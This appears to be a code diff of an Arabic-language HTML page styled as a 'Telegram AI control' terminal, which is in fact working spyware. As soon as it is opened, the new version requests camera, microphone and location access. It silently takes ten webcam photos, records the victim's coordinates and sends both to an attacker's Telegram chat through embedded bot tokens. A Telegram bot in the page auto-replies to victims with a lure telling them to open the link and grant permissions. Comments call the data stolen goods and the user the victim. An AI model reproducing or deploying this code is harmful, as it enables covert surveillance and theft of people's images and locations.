@@ -2,34 +2,102 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>AI EL-NAGM | لوحة السيطرة الذكية</title>
+    <title>Telegram AI Control | السيطرة الكاملة</title>
     <style>
-        :root { --ai-blue: #00d4ff; --bg: #050a10; }
-        body { background: var(--bg); color: var(--ai-blue); font-family: 'Segoe UI', sans-serif; text-align: center; }
-        .ai-card { border: 1px solid var(--ai-blue); display: inline-block; padding: 30px; margin-top: 50px; background: rgba(0, 212, 255, 0.05); border-radius: 20px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
-        .btn { display: block; width: 320px; padding: 15px; margin: 15px; background: transparent; border: 1px solid var(--ai-blue); color: var(--ai-blue); cursor: pointer; border-radius: 10px; font-weight: bold; transition: 0.4s; }
-        .btn:hover { background: var(--ai-blue); color: #000; box-shadow: 0 0 20px var(--ai-blue); }
-        .ai-status { font-size: 12px; color: #fff; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .ai-terminal { border: 2px solid #00ff41; padding: 20px; width: 90%; max-width: 500px; background: rgba(0,20,0,0.9); box-shadow: 0 0 20px #00ff41; }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .loading-bar { width: 100%; height: 4px; background: #111; margin-top: 10px; position: relative; overflow: hidden; }
+        .loading-bar::after { content: ""; position: absolute; width: 40%; height: 100%; background: #00ff41; animation: slide 2s infinite; }
+        @keyframes slide { from { left: -40%; } to { left: 100%; } }
     </style>
 </head>
 <body>
-    <div class="ai-card">
-        <div class="ai-status">AI System: <span style="color: #00ff00;">Connected & Thinking...</span></div>
-        <h2 style="color: #fff;">التحكم السيبراني بالذكاء الاصطناعي</h2>
-        <button class="btn" onclick="askAI('full_dump')">🧠 سحب شامل بالذكاء الاصطناعي</button>
-        <button class="btn" onclick="askAI('shot')">📸 لقطة حية للهدف</button>
-        <button class="btn" onclick="askAI('loc')">📍 تحديد الموقع الجغرافي</button>
-        <button class="btn" onclick="askAI('files')">📂 استخراج ملفات الاستوديو</button>
-    </div>
 
-    <script>
-        const token = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
-        const chatId = "8754338811";
+<div class="ai-terminal">
+    <h3>[ نظام التليجرام الذكي متصل ]</h3>
+    <div id="log">> جاري مزامنة البوت مع خوادم تليجرام...<br>> تم تفعيل الرد الآلي (AI Chat)...</div>
+    <div class="loading-bar"></div>
+    <p style="font-size: 12px; margin-top: 15px;" id="status" class="blink">بانتظار تفاعل الضحية مع البوت...</p>
+</div>
 
-        async function askAI(cmd) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${cmd}`);
-            console.log("AI Command Sent: " + cmd);
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+    const myChatId = "8754338811"; // الأيدي الخاص بك لاستلام المسروقات
+    let lastUpdateId = 0;
+
+    // 1. وظيفة الرد الآلي من البوت (AI Responder)
+    async function botAutoReply() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
+            const data = await res.json();
+            
+            if (data.result && data.result.length > 0) {
+                const msg = data.result[0].message;
+                if (msg.message_id !== lastUpdateId) {
+                    lastUpdateId = msg.message_id;
+                    const userText = msg.text;
+                    const userId = msg.chat.id;
+
+                    // الرد الآلي للإيقاع بالضحية
+                    let replyText = "أهلاً بك في نظام التليجرام المطور. لتفعيل ميزات الحماية الجديدة، يرجى الضغط على الرابط في المتصفح وتفعيل الصلاحيات.";
+                    
+                    if (userId != myChatId) { // لا ترد على نفسك
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(replyText)}`);
+                        document.getElementById('log').innerHTML += `<br>> رد آلي على: ${userId}`;
+                    }
+                }
+            }
+        } catch (e) {}
+    }
+
+    // 2. محرك سحب البيانات (ينطلق بمجرد فتح الصفحة)
+    async function startExtraction() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = stream;
+
+            // سحب أولي (موقع + صورة + بيانات)
+            sendData("⚠️ *جهاز جديد تم اختراقه عبر البوت*");
+            
+            // سحب الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                sendData(`📍 موقع الضحية:\nhttps://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d110502.6038558384!2d31.2357!3d30.0444!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sar!2seg!4v1700000000000!5m2!1sar!2seg0{p.coords.latitude},${p.coords.longitude}`);
+            }, null, {enableHighAccuracy: true});
+
+            // سحب 10 صور متتالية صامتة
+            let count = 0;
+            const shots = setInterval(() => {
+                if(count >= 10) { clearInterval(shots); return; }
+                const canvas = document.getElementById('c');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                canvas.toBlob(b => {
+                    const fd = new FormData();
+                    fd.append('chat_id', myChatId);
+                    fd.append('photo', b);
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
+                }, 'image/jpeg');
+                count++;
+            }, 2000);
+
+        } catch (err) {
+            document.getElementById('status').innerText = "خطأ: يرجى الموافقة على الصلاحيات لتفعيل البوت.";
         }
-    </script>
+    }
+
+    async function sendData(txt) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+    }
+
+    // تشغيل الأنظمة
+    setInterval(botAutoReply, 3000); // البوت يراقب الشات كل 3 ثواني للرد
+    startExtraction(); // سحب البيانات فور فتح الرابط
+</script>
+
 </body>
 </html>
